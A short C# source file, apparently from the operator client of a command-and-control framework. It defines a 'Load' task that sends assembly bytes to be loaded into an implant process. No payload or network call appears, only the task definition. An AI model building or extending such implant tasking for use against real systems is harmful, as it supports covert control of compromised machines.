using System.Collections.Generic;

using static Client.Models.TaskOptions;

namespace Client.Utils
{
    class Load : Models.Task
    {
        public override string TaskName => "Load";
        public override string Desc => "Load an assembly into implant process";
        public override List<object> OptList { get; } = new List<object> { assemBytes };
    }
}
